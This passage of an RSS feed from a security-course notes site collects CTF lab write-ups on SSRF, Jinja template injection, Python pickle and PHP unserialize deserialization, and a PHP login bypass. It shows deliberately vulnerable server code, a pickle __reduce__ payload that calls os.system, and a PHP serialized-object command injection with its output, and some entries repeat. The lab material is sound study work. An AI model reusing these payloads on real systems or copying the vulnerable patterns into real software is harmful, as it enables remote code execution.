 &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;url&amp;#34; placeholder=&amp;#34;URL&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;/source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt; | &amp;lt;a href=&amp;#34;/debug&amp;#34;&amp;gt;Debug&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
&amp;#39;&amp;#39;&amp;#39;

@app.route(&amp;#34;/proxy&amp;#34;)
def proxy():
 url = request.args.get(&amp;#34;url&amp;#34;)
 if url is None:
 return &amp;#34;No URL provided&amp;#34;
 if &amp;#34;https://&amp;#34; not in url:
 url = &amp;#34;https://&amp;#34; + url
 try:
 with urllib.request.urlopen(url) as response:
 return response.read()
 except urllib.error.HTTPError as e:
 return str(e)

@app.route(&amp;#34;/debug&amp;#34;)
def debug():
 # only allow access for localhost
 if request.remote_addr != &amp;#34;127.0.0.1&amp;#34;:
 return &amp;#34;Access denied&amp;#34;, 403
 return json.dumps(app.config, default=lambda _: None)

@app.route(&amp;#34;/source&amp;#34;)
def source():
 import re
 source_code = open(__file__).read()
 source_code = re.sub(r&amp;#39;FLAG{.*}&amp;#39;, r&amp;#39;FL4G{fake_flag}&amp;#39;, source_code, count=1)
 return Response(source_code, mimetype=&amp;#39;text/plain&amp;#39;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x15.5(Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</guid><description>&lt;h1 id="simple-web-0x155pickle">
 Simple Web 0x15.5(Pickle)
 &lt;a class="anchor" href="#simple-web-0x155pickle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background---pickle">
 Background - Pickle
 &lt;a class="anchor" href="#background---pickle">#&lt;/a>
&lt;/h2>
&lt;p>Python magic method: &lt;code>__reduce__&lt;/code>
&lt;code>__recude__&lt;/code> is used to define what needs to be done when deserializing.
&lt;a href="https://youtu.be/73uI7BK8k3g?t=236">Web Hacking | 終章【EDU-CTF 2021】&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler &lt;code>exploit.py&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">import pickle
import os
import pickletools

class exploit(object):
 def __reduce__(self):
 return (os.system, (&amp;#39;pwd&amp;#39;,))
 

serialized = pickle.dumps(exploit())
print(bytes.hex(serialized))
optim_s = pickletools.optimize(serialized)
print(pickletools.dis(serialized))
print(pickletools.dis(optim_s))
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;hr>
&lt;p>:::spoiler server_app.py&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import pickle

serialized = bytes.fromhex(input(&amp;#39;Data: &amp;#39;))
pickle.loads(serialized)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x15(Lab - `Jinja`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/</guid><description>&lt;h1 id="simple-web-0x15lab---jinja">
 Simple Web 0x15(Lab - &lt;code>Jinja&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x15lab---jinja">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8700/">http://h4ck3r.quest:8700/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/_hasOTGximc?t=5863">Web Security 0x1&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, render_template_string, request, send_file

app = Flask(__name__)


@app.get(&amp;#34;/&amp;#34;)
def home():
 return render_template_string(&amp;#34;&amp;#34;&amp;#34;
 &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;Your name&amp;#34;&amp;gt;
 &amp;lt;button&amp;gt;submit&amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;/source&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
 &amp;#34;&amp;#34;&amp;#34;)


@app.post(&amp;#34;/&amp;#34;)
def welcome_message():
 name = request.form.get(&amp;#39;name&amp;#39;)
 return render_template_string(&amp;#34;&amp;lt;p&amp;gt;Hello, &amp;#34; + name + &amp;#34;&amp;lt;/p&amp;gt;&amp;#34;)


@app.get(&amp;#34;/source&amp;#34;)
def source():
 return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)


if __name__ == &amp;#39;__main__&amp;#39;:
 app.run(threaded=True, debug=True)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16.5(php unserialize)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</guid><description>&lt;h1 id="simple-web-0x165php-unserialize">
 Simple Web 0x16.5(php unserialize)
 &lt;a class="anchor" href="#simple-web-0x165php-unserialize">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>php magic method
&lt;img src="https://i.imgur.com/xQrh7vo.png" alt="" />&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">class cat
{
 public $sound = &amp;#39;ls&amp;#39;;
 function __wakeup()
 {
 system(&amp;#34;echo&amp;#34;.$this-&amp;gt;sound);
 }
}
$cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
&lt;/code>&lt;/pre>&lt;h2 id="description--analyze">
 Description &amp;amp; Analyze
 &lt;a class="anchor" href="#description--analyze">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ php -a
php &amp;gt; class cat
php &amp;gt; public {
php { public $sound = &amp;#39;ls&amp;#39;;
php { function __wakeup()
php { {
php { system(&amp;#34;echo &amp;#34;.$this-&amp;gt;sound);
php { }
php { }
php &amp;gt; $_GET[&amp;#39;cat&amp;#39;]=&amp;#39;O:3:&amp;#34;cat&amp;#34;:1:{s:5:&amp;#34;sound&amp;#34;;s:4:&amp;#34;meow&amp;#34;;}&amp;#39;;
php &amp;gt; $cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
meow
php &amp;gt; $_GET[&amp;#39;cat&amp;#39;]=&amp;#39;O:3:&amp;#34;cat&amp;#34;:1:{s:5:&amp;#34;sound&amp;#34;;s:4:&amp;#34;;id;&amp;#34;;}&amp;#39;;
php &amp;gt; $cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);

uid=1000(sbk6401) gid=1000(sbk6401) groups=1000(sbk6401),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
&lt;/code>&lt;/pre>&lt;p>This is a typical command injection. The magic method &lt;code>__wakeup()&lt;/code> will be called when unserialized something.&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
 Simple Web 0x16(Lab - Pickle)
 &lt;a class="anchor" href="#simple-web-0x16lab---pickle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8600/">http://h4ck3r.quest:8600/&lt;/a>
Note: open a brand new window that haven&amp;rsquo;t login &lt;code>http://h4ck3r.quest&lt;/code>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/IcoQql7UQiegLv8KtK2wOw">0x15.5(Pickle)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
import base64
import pickle

app = Flask(__name__)


@app.route(&amp;#34;/sauce&amp;#34;)
def sauce():
 return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)


@app.route(&amp;#34;/&amp;#34;)
def main():
 session = request.cookies.get(&amp;#34;session&amp;#34;)
 if session == None:
 return &amp;#39;&amp;lt;form action=&amp;#34;/login&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Name: &amp;lt;input name=&amp;#34;name&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Age: &amp;lt;input name=&amp;#34;age&amp;#34; type=&amp;#34;number&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;button&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;a href=&amp;#34;/sauce&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;#39;

 else:
 user = pickle.loads(base64.b64decode(session))
 return f&amp;#39;&amp;lt;p&amp;gt;Name: {user[&amp;#34;name&amp;#34;]}&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Age: {user[&amp;#34;age&amp;#34;]}&amp;lt;/p&amp;gt;&amp;#39;


@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
def login():
 user = base64.b64encode(pickle.dumps({
 &amp;#34;name&amp;#34;: request.form.get(&amp;#39;name&amp;#39;),
 &amp;#34;age&amp;#34;: int(request.form.get(&amp;#39;age&amp;#39;))
 }))
 resp = make_response(redirect(&amp;#39;/&amp;#39;))
 resp.set_cookie(&amp;#34;session&amp;#34;, user)
 return resp
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
 Simple Web 0x16(Lab - Pickle)
 &lt;a class="anchor" href="#simple-web-0x16lab---pickle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8600/">http://h4ck3r.quest:8600/&lt;/a>
Note: open a brand new window that haven&amp;rsquo;t login &lt;code>http://h4ck3r.quest&lt;/code>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/IcoQql7UQiegLv8KtK2wOw">0x15.5(Pickle)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
import base64
import pickle

app = Flask(__name__)


@app.route(&amp;#34;/sauce&amp;#34;)
def sauce():
 return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)


@app.route(&amp;#34;/&amp;#34;)
def main():
 session = request.cookies.get(&amp;#34;session&amp;#34;)
 if session == None:
 return &amp;#39;&amp;lt;form action=&amp;#34;/login&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Name: &amp;lt;input name=&amp;#34;name&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Age: &amp;lt;input name=&amp;#34;age&amp;#34; type=&amp;#34;number&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;button&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;a href=&amp;#34;/sauce&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;#39;

 else:
 user = pickle.loads(base64.b64decode(session))
 return f&amp;#39;&amp;lt;p&amp;gt;Name: {user[&amp;#34;name&amp;#34;]}&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Age: {user[&amp;#34;age&amp;#34;]}&amp;lt;/p&amp;gt;&amp;#39;


@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
def login():
 user = base64.b64encode(pickle.dumps({
 &amp;#34;name&amp;#34;: request.form.get(&amp;#39;name&amp;#39;),
 &amp;#34;age&amp;#34;: int(request.form.get(&amp;#39;age&amp;#39;))
 }))
 resp = make_response(redirect(&amp;#39;/&amp;#39;))
 resp.set_cookie(&amp;#34;session&amp;#34;, user)
 return resp
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
 Simple Web 0x17(Lab - Baby Cat)
 &lt;a class="anchor" href="#simple-web-0x17lab---baby-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8601/">http://h4ck3r.quest:8601/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/FkF8p-zrSMSOWFkE4vvAJQ">0x16.5(php unserialize)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Cat
{
 public $name = &amp;#39;(guest cat)&amp;#39;;
 function __construct($name)
 {
 $this-&amp;gt;name = $name;
 }
 function __wakeup()
 {
 echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;;
 system(&amp;#34;cowsay &amp;#39;Welcome back, $this-&amp;gt;name&amp;#39;&amp;#34;);
 echo &amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;;
 }
}

if (!isset($_COOKIE[&amp;#39;cat_session&amp;#39;])) {
 $cat = new Cat(&amp;#34;cat_&amp;#34; . rand(0, 0xffff));
 setcookie(&amp;#39;cat_session&amp;#39;, base64_encode(serialize($cat)));
} else {
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat_session&amp;#39;]));
}
?&amp;gt;
&amp;lt;p&amp;gt;Hello, &amp;lt;?= $cat-&amp;gt;name ?&amp;gt;.&amp;lt;/p&amp;gt;
&amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;source code&amp;lt;/a&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
 Simple Web 0x17(Lab - Baby Cat)
 &lt;a class="anchor" href="#simple-web-0x17lab---baby-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8601/">http://h4ck3r.quest:8601/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/FkF8p-zrSMSOWFkE4vvAJQ">0x16.5(php unserialize)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Cat
{
 public $name = &amp;#39;(guest cat)&amp;#39;;
 function __construct($name)
 {
 $this-&amp;gt;name = $name;
 }
 function __wakeup()
 {
 echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;;
 system(&amp;#34;cowsay &amp;#39;Welcome back, $this-&amp;gt;name&amp;#39;&amp;#34;);
 echo &amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;;
 }
}

if (!isset($_COOKIE[&amp;#39;cat_session&amp;#39;])) {
 $cat = new Cat(&amp;#34;cat_&amp;#34; . rand(0, 0xffff));
 setcookie(&amp;#39;cat_session&amp;#39;, base64_encode(serialize($cat)));
} else {
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat_session&amp;#39;]));
}
?&amp;gt;
&amp;lt;p&amp;gt;Hello, &amp;lt;?= $cat-&amp;gt;name ?&amp;gt;.&amp;lt;/p&amp;gt;
&amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;source code&amp;lt;/a&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
 Simple Web 0x18(Lab - Magic Cat)
 &lt;a class="anchor" href="#simple-web-0x18lab---magic-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8602/">http://h4ck3r.quest:8602/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>None&amp;hellip;&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=&lt;?php" data-lang="php=&lt;?php">isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Magic
{
 function cast($spell)
 {
 echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;MAGIC, $spell!&amp;#39;);&amp;lt;/script&amp;gt;&amp;#34;;
 }
}

// Useless class?
class Caster
{
 public $cast_func = &amp;#39;intval&amp;#39;;
 function cast($val)
 {
 return ($this-&amp;gt;cast_func)($val);
 }
}


class Cat
{
 public $magic;
 public $spell;
 function __construct($spell)
 {
 $this-&amp;gt;magic = new Magic();
 $this-&amp;gt;spell = $spell;
 }
 function __wakeup()
 {
 echo &amp;#34;Cat Wakeup!\n&amp;#34;;
 $this-&amp;gt;magic-&amp;gt;cast($this-&amp;gt;spell);
 }
}

if (isset($_GET[&amp;#39;spell&amp;#39;])) {
 $cat = new Cat($_GET[&amp;#39;spell&amp;#39;]);
} else if (isset($_COOKIE[&amp;#39;cat&amp;#39;])) {
 echo &amp;#34;Unserialize...\n&amp;#34;;
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat&amp;#39;]));
} else {
 $cat = new Cat(&amp;#34;meow-meow-magic&amp;#34;);
}
?&amp;gt;
&amp;lt;pre&amp;gt;
This is your 🐱:
&amp;lt;?php var_dump($cat) ?&amp;gt;
&amp;lt;/pre&amp;gt;

&amp;lt;p&amp;gt;Usage:&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?source&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?spell=the-spell-of-your-cat&amp;lt;/p&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
 Simple Web 0x18(Lab - Magic Cat)
 &lt;a class="anchor" href="#simple-web-0x18lab---magic-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8602/">http://h4ck3r.quest:8602/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>None&amp;hellip;&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=&lt;?php" data-lang="php=&lt;?php">isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Magic
{
 function cast($spell)
 {
 echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;MAGIC, $spell!&amp;#39;);&amp;lt;/script&amp;gt;&amp;#34;;
 }
}

// Useless class?
class Caster
{
 public $cast_func = &amp;#39;intval&amp;#39;;
 function cast($val)
 {
 return ($this-&amp;gt;cast_func)($val);
 }
}


class Cat
{
 public $magic;
 public $spell;
 function __construct($spell)
 {
 $this-&amp;gt;magic = new Magic();
 $this-&amp;gt;spell = $spell;
 }
 function __wakeup()
 {
 echo &amp;#34;Cat Wakeup!\n&amp;#34;;
 $this-&amp;gt;magic-&amp;gt;cast($this-&amp;gt;spell);
 }
}

if (isset($_GET[&amp;#39;spell&amp;#39;])) {
 $cat = new Cat($_GET[&amp;#39;spell&amp;#39;]);
} else if (isset($_COOKIE[&amp;#39;cat&amp;#39;])) {
 echo &amp;#34;Unserialize...\n&amp;#34;;
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat&amp;#39;]));
} else {
 $cat = new Cat(&amp;#34;meow-meow-magic&amp;#34;);
}
?&amp;gt;
&amp;lt;pre&amp;gt;
This is your 🐱:
&amp;lt;?php var_dump($cat) ?&amp;gt;
&amp;lt;/pre&amp;gt;

&amp;lt;p&amp;gt;Usage:&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?source&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?spell=the-spell-of-your-cat&amp;lt;/p&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x19(Lab - PHP Login)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/</guid><description>&lt;h1 id="simple-web-0x19lab---php-login">
 Simple Web 0x19(Lab - PHP Login)
 &lt;a class="anchor" href="#simple-web-0x19lab---php-login">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8081">http://h4ck3r.quest:8081&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
// BSides Ahmedabad CTF 2021: entrance

include &amp;#39;flag.php&amp;#39;;
$users = array(
 &amp;#34;admin&amp;#34; =&amp;gt; &amp;#34;ed2b7b57b3b5be3e8d4246c69e4b513608ffb352&amp;#34;,
 &amp;#34;guest&amp;#34; =&amp;gt; &amp;#34;35675e68f4b5af7b995d9205ad0fc43842f16450&amp;#34;
);

function lookup($username) {
 global $users;
 return array_key_exists($username, $users) ? $users[$username] : &amp;#34;&amp;#34;;
}

if (!empty($_POST[&amp;#39;username&amp;#39;]) &amp;amp;&amp;amp; !empty($_POST[&amp;#39;password&amp;#39;])) {
 $sha1pass = lookup($_POST[&amp;#39;username&amp;#39;]);
 if ($sha1pass == sha1($_POST[&amp;#39;password&amp;#39;])) {
 if ($_POST[&amp;#39;username&amp;#39;] !== &amp;#39;guest&amp;#39;) echo $FLAG;
 else echo &amp;#39;Welcome guest!&amp;#39;;
 } else {
 echo &amp;#39;Login Failed!&amp;#39;;
 }
} else {
 echo &amp;#34;You can login with guest:guest&amp;#34;;
}
echo &amp;#34;&amp;lt;br&amp;gt;\n&amp;#34;;
highlight_file(__file__);
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
